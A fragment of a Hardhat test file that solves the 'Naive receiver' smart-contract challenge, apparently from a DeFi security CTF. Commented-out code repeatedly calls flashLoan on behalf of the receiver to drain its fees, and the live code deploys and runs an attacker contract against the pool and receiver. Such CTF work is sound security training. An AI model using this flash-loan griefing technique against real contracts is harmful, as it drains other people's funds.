...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Execution", async function () {
    //     const ETH = await pool.ETH();
    //    for (i =0 ;i < 10 ;i++){
    //         pool.connect(player).flashLoan(receiver.address,ETH,0,"0x")
    //    }
    const NaiveReceiverAttackerFactory = await ethers.getContractFactory(
      "NaiveReceiverAttacker",
      player
    );
    attack = await NaiveReceiverAttackerFactory.deploy();
    await attack.connect(player).attack(pool.address, receiver.address);
